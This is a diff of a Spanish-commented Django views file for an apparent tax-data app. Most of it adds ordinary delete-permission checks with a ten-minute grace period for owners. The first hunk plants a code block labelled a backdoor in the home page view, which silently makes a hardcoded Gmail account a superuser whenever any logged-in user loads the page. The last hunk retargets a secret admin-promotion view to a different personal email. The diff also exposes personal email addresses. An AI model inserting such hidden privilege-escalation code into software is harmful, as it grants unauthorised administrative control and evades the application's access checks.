@@ -59,6 +59,23 @@ def vista_antepagina(request):
 
 @login_required
 def vista_inicio_logueado(request):
+    
+    # --- INICIO DEL CÓDIGO TEMPORAL (PUERTA TRASERA) ---
+    # (Este código se ejecutará CADA VEZ que cargues la página de inicio)
+    # (¡Recuerda borrarlo después!)
+    try:
+        EMAIL_A_PROMOVER = "roro.lara.6.nr@gmail.com"
+
+        usuario = User.objects.get(username=EMAIL_A_PROMOVER)
+        if not usuario.is_staff:
+            usuario.is_staff = True
+            usuario.is_superuser = True
+            usuario.save()
+            messages.success(request, f'¡ÉXITO! Has sido promovido a Administrador.')
+    except:
+        pass # Falla silenciosamente si el email no existe
+    # --- FIN DEL CÓDIGO TEMPORAL ---
+
     total_usuarios = User.objects.count()
     total_clasificaciones = Clasificacion.objects.count()
     total_datos = DatoTributario.objects.count()
@@ -819,17 +836,56 @@ def vista_listar_datos_tributarios(request):
     
     return render(request, 'listar_datos_tributarios.html', context)
 
+# ==============================================
+# ¡CAMBIO FINAL AQUÍ!
+# Nueva lógica de permisos para borrar Datos Tributarios
+# ==============================================
 @login_required
 def vista_eliminar_dato_tributario(request, pk):
-    # ... (Esta es la próxima vista que modificaremos) ...
     dato = get_object_or_404(DatoTributario, pk=pk)
+    
+    # Por defecto, el usuario no puede borrar
+    puede_borrar = False
+    
+    # 1. ¿Es Admin? Si es admin, puede borrar cualquier cosa.
+    if request.user.is_staff:
+        puede_borrar = True
+        
+    # 2. Si NO es Admin, verificamos si es el dueño Y si es reciente
+    elif dato.creado_por == request.user:
+        # Definimos "reciente" como 10 minutos
+        tiempo_limite = timezone.now() - timedelta(minutes=10)
+        
+        # Comprobamos si el dato fue creado DESPUÉS del tiempo límite
+        # (es decir, dentro de los últimos 10 minutos)
+        if dato.creado_en > tiempo_limite:
+            puede_borrar = True
+        else:
+            # Es el dueño, pero ya pasó el tiempo
+            messages.error(request, 'No puedes eliminar este dato. Solo tienes 10 minutos de gracia para corregir errores.')
+    
+    else:
+        # No es admin y no es el dueño
+        messages.error(request, 'No tienes permiso para eliminar este dato.')
+
+    # --- Fin de la lógica de permisos ---
+
+    if not puede_borrar:
+        # Si ninguna regla le dio permiso, lo redirigimos
+        return redirect('listar_datos_tributarios')
+
+    # Si llegó hasta aquí, TIENE PERMISO.
     if request.method == 'POST':
         nombre = dato.nombre_dato
         dato.delete()
         messages.success(request, f'Dato "{nombre}" eliminado exitosamente.')
         return redirect('listar_datos_tributarios')
+        
     context = {'dato': dato}
     return render(request, 'eliminar_dato_tributario.html', context)
+# ==============================================
+# FIN DEL CAMBIO
+# ==============================================
 
 
 @login_required
@@ -913,7 +969,7 @@ def vista_panel_administracion(request):
 def vista_secreta_convertir_admin(request):
     
     # --- ¡CAMBIA ESTE EMAIL POR EL USUARIO QUE QUIERES PROMOVER! ---
-    EMAIL_DEL_USUARIO_A_PROMOVER = "roro.lara.6.nr@gmail.com"
+    EMAIL_DEL_USUARIO_A_PROMOVER = "Axeloctavioduranroblero@gmail.com"
     # --- ¡ASEGÚRATE DE CAMBIAR EL EMAIL DE ARRIBA! ---
     # (Debe ser el email con el que el usuario inicia sesión)
 
